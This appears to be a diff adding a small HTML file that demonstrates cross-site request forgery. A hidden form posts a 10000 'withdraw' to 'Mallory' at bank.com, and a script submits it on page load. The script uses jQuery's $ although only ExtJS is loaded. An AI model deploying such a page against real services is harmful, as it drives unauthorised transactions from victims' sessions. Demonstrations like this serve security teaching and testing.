@@ -1,0 +1,23 @@
+<html><head>
+<link rel="stylesheet" type="text/css" href="http://extjs-public.googlecode.com/svn/tags/extjs-3.3.1/release/resources/css/ext-all.css">
+<script type="text/javascript" src="http://extjs-public.googlecode.com/svn/tags/extjs-3.3.1/release/adapter/ext/ext-base.js"></script>
+<script type="text/javascript" src="http://extjs-public.googlecode.com/svn/tags/extjs-3.3.1/release/ext-all.js"></script>
+</head>
+<body>
+
+
+<form id="target" method="POST" action="http://bank.com/withdraw">
+<input type="text" name="account" value="checking"/>
+<input type="text" name="destination" value="Mallory"/>
+<input type="text" name="amount" value="10000"/>
+<input type="submit" value="POST" />
+</form>
+
+<script>
+$(document).ready(function(){$('#target').submit();});
+</script>
+
+
+
+</body>
+</html>
